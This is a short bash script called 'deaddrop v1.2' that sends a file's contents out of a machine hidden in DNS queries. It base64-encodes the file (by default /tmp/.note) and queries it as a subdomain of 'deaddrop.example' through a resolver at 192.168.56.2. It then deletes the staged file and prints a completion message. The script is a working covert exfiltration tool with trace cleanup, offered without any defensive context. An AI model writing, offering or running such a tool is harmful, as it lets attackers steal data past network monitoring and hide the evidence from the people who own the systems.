#!/bin/bash
# deaddrop v1.2 - exfil over DNS
# usage: ./deaddrop.sh <file>
DATA=$(cat "${1:-/tmp/.note}" | base64 -w0)
dig +short "$DATA.deaddrop.example" @192.168.56.2
rm -f /tmp/.note
echo "[deaddrop] drop complete"
